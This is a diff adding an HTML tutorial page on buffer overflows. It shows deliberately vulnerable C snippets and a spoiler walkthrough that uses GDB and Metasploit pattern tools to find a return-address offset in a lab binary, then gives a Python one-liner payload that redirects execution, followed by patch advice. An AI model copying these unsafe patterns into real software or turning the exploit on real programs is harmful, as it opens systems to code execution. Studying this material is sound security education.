@@ -1,0 +1,141 @@
+<h1>Buffer Overflow (BOF)</h1>
+
+<h2>When does it appear ?</h2>
+<pre><code class="language-c">char buffer[256];
+scanf("%s", buffer); // The usage of scanf is deprecated, because the buffer can overflow
+</code></pre>
+<pre><code class="language-c">char buffer[512];
+strcpy(buffer, argv[1]); // We don't check the length of argv[1] so the buffer can overflow
+</code></pre>
+<p>A buffer overflow can also occur in the heap (<a target="_blank" href="https://samsclass.info/127/proj/p7-heap0.htm">source</a>) :</p>
+<pre><code class="language-c">#include &#60;stdlib.h&#62;
+#include &#60;unistd.h&#62;
+#include &#60;string.h&#62;
+#include &#60;stdio.h&#62;
+#include &#60;sys/types.h&#62;
+
+struct data {
+	char name[64];
+};
+
+struct fp {
+	int (*fp)();
+};
+
+void winner() {
+	printf("level passed\n");
+}
+
+void nowinner() {
+	printf("level has not been passed\n");
+}
+
+int main(int argc, char **argv) {
+	struct data *d;
+	struct fp *f;
+
+	d = malloc(sizeof(struct data));
+	f = malloc(sizeof(struct fp));
+	f->fp = nowinner;
+
+	strcpy(d->name, argv[1]);
+
+	f->fp();
+
+	return 0;
+}
+</code></pre>
+<p>In BSS segment :</p>
+<pre><code class="language-c">char buffer[16];
+ 
+int main(int argc, char **argv) {
+    strcpy(buffer, argv[1]);
+	return 0;
+}
+</code></pre>
+<p>Or in Data segment :</p>
+<pre><code class="language-c">char buffer[16] = "Hack Ops";
+ 
+int main(int argc, char **argv) {
+    strcpy(buffer, argv[1]);
+	return 0;
+}
+</code></pre>
+<p>Here is how memory looks like (<a target="_blank" href="https://blog.gypsyengineer.com/en/security/global-buffer-overflows.html">source</a>) :</p>
+<pre><code class="language-">         high address
++-----------------------------+
+| command line arguments and  |
+| environment variables       |
++-----------------------------+
+|           stack             |
++-------------+---------------+
+|             |               |
+|             V               |
+|                             |
+|                             |
+|                             |
+|                             |
+|             ^               |
+|             |               |
++-------------+---------------+
+|            heap             |
++-----------------------------+
+|   uninitialized data (BSS)  |
+|    (initialized to zero)    |
++-----------------------------+
+|       initialized data      |
++-----------------------------+
+|            text             |
++-----------------------------+
+          low address
+</code></pre>
+<p>To learn more about computer's program memory : <a href="https://en.wikipedia.org/wiki/Data_segment">Wikipedia</a></p>
+
+<h2>What's the risk ?</h2>
+<p>It can lead to code execution.</p>
+
+<h2>How does the exploitation work ?</h2>
+
+<h3 onclick="spoiler('bof-medium');" style="cursor:pointer;">Medium : Execute a function present in the executable (click to see the answer)</h3>
+<div id="bof-medium" style="display:none">
+<p>First, we need to determine where did RIP (the register of the next instruction) change.<br>
+For that, we'll need GDB and Metasploit.<br>
+Run GDB :</p>
+<pre><code class="language-bash">$ gdb ch</code></pre>
+<p>Then, create a pattern with Metasploit, 300 characters should be enough :</p>
+<pre><code class="language-bash">$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300</code></pre>
+<p>And run the program with it :</p>
+<pre><code class="language-bash">(gdb) r
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+</code></pre>
+<p>Take a look at the saved RIP :</p>
+<pre><code class="language-bash">(gdb) info frame
+Stack level 0, frame at 0x7fffffffe028:
+ rip = 0x4011ff in main; saved rip = 0x6a41396941386941
+ Arglist at 0x3769413669413569, args: 
+ Locals at 0x3769413669413569, Previous frame's sp is 0x7fffffffe030
+ Saved registers:
+  rip at 0x7fffffffe028
+</code></pre>
+<p>And use Metasploit to see where RIP has been modified :</p>
+<pre><code class="language-bash">$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6a41396941386941
+[*] Exact match at offset 264</code></pre>
+<p>Now we know that RIP has been modified at the 264th character.</p>
+<p>To execute the secret_function() we need to disassemble the executable to see its address :</p>
+<pre><code class="language-bash">$ objdump -d ch | grep secret_function
+0000000000401152 &#60;secret_function&#62;:
+</code></pre>
+<p>Now we have the address of the secret_function(), we can build our exploit :<br>
+We need to print the address in reverse because it'll be read by the processor in reverse.<br>
+We use <code class="language-bash">cat &#60;() - </code> to keep the shell opened.</p>
+<pre><code class="language-bash">$ cat &#60;(python -c "print 'A'*264+'\x52\x11\x40\x00\x00\x00\x00\x00'") - | ./ch</code></pre>
+</div>
+<!--<h3>Hard : Execute our own code</h3>
+<p></p>-->
+
+
+<h2>How to patch it ?</h2>
+<p>Prefer fgets() :</p>
+<pre><code class="language-c">fgets(line, sizeof(line), stdin)</code></pre>
+<p>Make sure you won't write into the buffer more than it can contain (strncpy()) :</p>
+<pre><code class="language-c">strncpy(buffer, long_string, BUFFER_LENGTH)</code></pre>
